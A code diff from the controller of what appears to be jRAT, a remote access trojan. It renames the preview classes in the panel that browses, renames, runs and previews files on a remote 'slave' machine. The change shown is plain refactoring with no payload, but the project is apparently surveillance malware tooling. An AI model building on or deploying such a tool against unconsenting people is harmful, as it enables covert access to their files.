@@ -16,9 +16,9 @@ import jrat.controller.utils.Utils;
 import jrat.module.fs.FileSystem;
 import jrat.module.fs.packets.Packet15ListFiles;
 import jrat.module.fs.packets.Packet47RenameFile;
-import jrat.module.fs.ui.previews.FilePreview;
-import jrat.module.fs.ui.previews.FramePreviewFile;
-import jrat.module.fs.ui.previews.FramePreviewZip;
+import jrat.module.fs.ui.previews.PreviewPanel;
+import jrat.module.fs.ui.previews.PanelPreviewFile;
+import jrat.module.fs.ui.previews.PanelPreviewArchive;
 import oslib.OperatingSystem;
 
 import javax.swing.*;
@@ -274,7 +274,7 @@ public class PanelRemoteFiles extends JPanel {
 
 			popupMenuRemote.add(mntmRun);
 
-			JMenuItem mntmPreviewFiletext = new JMenuItem("FilePreview file (Text, ZIP, Image)");
+			JMenuItem mntmPreviewFiletext = new JMenuItem("PreviewPanel file (Text, ZIP, Image)");
 			mntmPreviewFiletext.setIcon(Resources.getIcon("preview"));
 			mntmPreviewFiletext.addActionListener(new ActionListener() {
 				@Override
@@ -493,21 +493,21 @@ public class PanelRemoteFiles extends JPanel {
                     String file = fo.getPath();
                     String extension = file.toLowerCase().substring(file.lastIndexOf("."));
 
-                    FilePreview preview = null;
+                    PreviewPanel preview = null;
 
                     switch (extension) {
                         case ".png":
                         case ".jpg":
                         case ".jpeg":
                         case ".gif":
-                            //preview = new FramePreviewImage(slave, file);
+                            //preview = new PanelPreviewImage(slave, file);
                             break;
                         case ".zip":
                         case ".jar":
-                            preview = new FramePreviewZip(slave, file);
+                            preview = new PanelPreviewArchive(slave, file);
                             break;
                         default:
-                            preview = new FramePreviewFile(slave, file);
+                            preview = new PanelPreviewFile(slave, file);
                             break;
                     }
 
